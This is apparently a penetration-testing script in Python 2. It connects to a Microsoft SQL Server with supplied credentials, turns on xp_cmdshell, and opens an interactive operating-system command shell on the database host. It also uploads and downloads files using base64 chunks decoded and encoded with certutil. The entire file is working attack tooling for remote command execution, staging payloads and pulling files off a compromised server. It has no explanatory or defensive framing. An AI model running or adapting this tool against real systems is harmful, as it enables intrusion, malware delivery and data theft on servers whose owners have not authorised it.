#!/usr/bin/env python2
from __future__ import print_function

# Author: Alamot
# Download functionality: Qazeer
# Use pymssql >= 1.0.3 (otherwise it doesn't work correctly)
# To upload a file, type: UPLOAD local_path remote_path
# e.g. UPLOAD myfile.txt C:\temp\myfile.txt
# If you omit the remote_path it uploads the file on the current working folder.
# To dowload a file from the remote host, type: DOWNLOAD remote_path [local_path]
# e.g. DOWNLOAD myfile.txt
# Or DOWNLOAD remotefile.txt /tmp/file.txt
# Be aware that pymssql has some serious memory leak issues when the connection fails (see: https://github.com/pymssql/pymssql/issues/512).
import _mssql
import base64
import ntpath
import os
import random
import shlex
import string
import sys
import tqdm
import hashlib
from io import open
try: input = raw_input
except NameError: pass

MSSQL_SERVER = '<IP>'
MSSQL_USERNAME = '<USERNAME>'
MSSQL_PASSWORD = '<PASSWORD>'
BUFFER_SIZE = 5*1024
TIMEOUT = 30


def id_generator(size=12, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


def process_result(mssql):
    username = ""
    computername = ""
    cwd = ""
    rows = list(mssql)
    for row in rows[:-3]:
        columns = row.keys()
        print(row[columns[-1]])
    if len(rows) >= 3:
        (username, computername) = rows[-3][rows[-3].keys()[-1]].split('|')
        cwd = rows[-2][rows[-3].keys()[-1]]
    return (username.rstrip(), computername.rstrip(), cwd.rstrip())


def upload(mssql, stored_cwd, local_path, remote_path):
    print("Uploading "+local_path+" to "+remote_path)
    cmd = 'type nul > "' + remote_path + '.b64"'
    mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")

    with open(local_path, 'rb') as f:
        data = f.read()
        md5sum = hashlib.md5(data).hexdigest()
        b64enc_data = "".join(base64.encodestring(data).split())

    print("Data length (b64-encoded): "+str(len(b64enc_data)/1024)+"KB")
    for i in tqdm.tqdm(range(0, len(b64enc_data), BUFFER_SIZE), unit_scale=BUFFER_SIZE/1024, unit="KB"):
        cmd = 'echo '+b64enc_data[i:i+BUFFER_SIZE]+' >> "' + remote_path + '.b64"'
        mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")
        #print("Remaining: "+str(len(b64enc_data)-i))

    cmd = 'certutil -decode "' + remote_path + '.b64" "' + remote_path + '"'
    mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
    process_result(mssql)
    cmd = 'certutil -hashfile "' + remote_path + '" MD5'
    mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
    if md5sum in [row[row.keys()[-1]].strip() for row in mssql if row[row.keys()[-1]]]:
        print("MD5 hashes match: " + md5sum)
    else:
        print("ERROR! MD5 hashes do NOT match!")


def dowload(mssql, stored_cwd, remote_path, local_path=""):
    remote_path = remote_path.replace('"', '').replace('\'', '')
    if local_path == "":
        local_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), ntpath.basename(remote_path))

    print("Downloading " + remote_path + " to " + local_path)

    tmp_filename = '%TEMP%\\' + id_generator() + ".b64"
    cmd = 'del "' + tmp_filename + '"'
    mssql.execute_query("EXEC xp_cmdshell '" + cmd + "'")

    cmd = 'certutil -encode "' + remote_path + '" "' + tmp_filename + '"'
    mssql.execute_query("EXEC xp_cmdshell 'cd " + stored_cwd + " & " + cmd + " & echo %username%^|%COMPUTERNAME% & cd'")

    cmd = 'type "' + tmp_filename + '"'
    mssql.execute_query("EXEC xp_cmdshell 'cd " + stored_cwd + " & " + cmd + " & echo %username%^|%COMPUTERNAME% & cd'")

    certutil_result = list(mssql)

    try:
        if "CERTIFICATE-----" not in str(certutil_result[0][0]):
            raise Exception()
    except:
        return "echo *** ERROR WHILE DOWNLOADING THE FILE ***"

    file_b64 = ""
    for row in certutil_result[1:-4]:
        columns = list(row)
        file_b64 += row[columns[-1]]

    with open(local_path, 'wb') as f:
        data = base64.b64decode(file_b64, None)
        f.write(data)

    tmp_filename = '%TEMP%\\' + tmp_filename + ".b64"
    cmd = 'del "' + tmp_filename + '"'
    mssql.execute_query("EXEC xp_cmdshell '" + cmd + "'")

    return "echo *** DOWNLOAD PROCEDURE FINISHED ***"


def shell():
    mssql = None
    stored_cwd = None
    try:
        mssql = _mssql.connect(server=MSSQL_SERVER, user=MSSQL_USERNAME, password=MSSQL_PASSWORD)
        print("Successful login: "+MSSQL_USERNAME+"@"+MSSQL_SERVER)

        print("Trying to enable xp_cmdshell ...")
        mssql.execute_query("EXEC sp_configure 'show advanced options',1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell',1;RECONFIGURE")

        cmd = 'echo %username%^|%COMPUTERNAME% & cd'
        mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")
        (username, computername, cwd) = process_result(mssql)
        stored_cwd = cwd

        while True:
            cmd = raw_input("CMD "+username+"@"+computername+" "+cwd+"> ").rstrip("\n").replace("'", "''")
            if cmd.lower()[0:4] == "exit":
                mssql.close()
                return
            elif cmd[0:6] == "UPLOAD":
                upload_cmd = shlex.split(cmd, posix=False)
                if len(upload_cmd) < 3:
                    upload(mssql, stored_cwd, upload_cmd[1], stored_cwd+"\\"+upload_cmd[1])
                else:
                    upload(mssql, stored_cwd, upload_cmd[1], upload_cmd[2])
                cmd = "echo *** UPLOAD PROCEDURE FINISHED ***"
            elif cmd[0:8] == "DOWNLOAD":
                dowload_cmd = shlex.split(cmd, posix=False)
                if len(dowload_cmd) < 3:
                    cmd = dowload(mssql, stored_cwd, dowload_cmd[1])
                else:
                    cmd = dowload(mssql, stored_cwd, dowload_cmd[1], dowload_cmd[2])
            mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
            (username, computername, cwd) = process_result(mssql)
            stored_cwd = cwd

    except _mssql.MssqlDatabaseException as e:
        if  e.severity <= 16:
            print("MSSQL failed: "+str(e))
        else:
            raise
    finally:
        if mssql:
            mssql.close()

shell()
sys.exit()
